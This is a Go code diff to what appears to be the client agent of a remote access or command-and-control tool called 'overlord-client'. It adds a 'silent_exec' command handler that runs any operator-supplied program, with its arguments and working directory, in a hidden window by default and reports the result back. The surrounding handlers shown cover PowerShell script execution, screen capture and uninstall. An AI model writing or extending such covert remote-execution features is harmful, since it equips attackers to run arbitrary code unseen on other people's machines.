@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 
 	"overlord-client/cmd/agent/capture"
@@ -492,6 +493,41 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			scriptType = "powershell"
 		}
 		return HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType)
+	case "silent_exec":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload == nil {
+			if rawPayload, ok := envelope["payload"].(map[interface{}]interface{}); ok {
+				payload = make(map[string]interface{}, len(rawPayload))
+				for k, v := range rawPayload {
+					ks, ok := k.(string)
+					if !ok {
+						continue
+					}
+					payload[ks] = v
+				}
+			}
+		}
+		command, _ := payload["command"].(string)
+		command = strings.TrimSpace(command)
+		if len(command) >= 2 {
+			if (command[0] == '"' && command[len(command)-1] == '"') || (command[0] == '\'' && command[len(command)-1] == '\'') {
+				command = command[1 : len(command)-1]
+			}
+		}
+		argsRaw, _ := payload["args"].(string)
+		hideWindow := true
+		if v, ok := payload["hideWindow"].(bool); ok {
+			hideWindow = v
+		}
+		cwd, _ := payload["cwd"].(string)
+		if command == "" {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing command"})
+		}
+		args := parseCommandArgs(argsRaw)
+		if err := startSilentProcess(command, args, cwd, hideWindow); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "uninstall":
 		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
 		_ = wire.WriteMsg(ctx, env.Conn, res)
